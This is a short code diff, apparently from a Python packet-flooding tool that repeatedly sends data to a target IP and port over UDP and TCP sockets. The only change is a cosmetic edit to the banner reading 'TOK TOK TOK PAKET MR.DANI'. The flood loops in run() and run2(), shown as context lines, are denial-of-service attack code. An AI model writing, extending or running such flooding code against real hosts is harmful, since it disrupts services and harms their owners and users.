@@ -21,7 +21,7 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" TOK TOK TOK PAKET DARI MR.DANI")
+			print(i +" TOK TOK TOK PAKET MR.DANI")
 		except:
 			print("[!] Error!!!")
 
@@ -35,7 +35,7 @@ def run2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +" TOK TOK TOK PAKET DARI MR.DANI")
+			print(i +" TOK TOK TOK PAKET MR.DANI")
 		except:
 			s.close()
 			print("[*] Error")
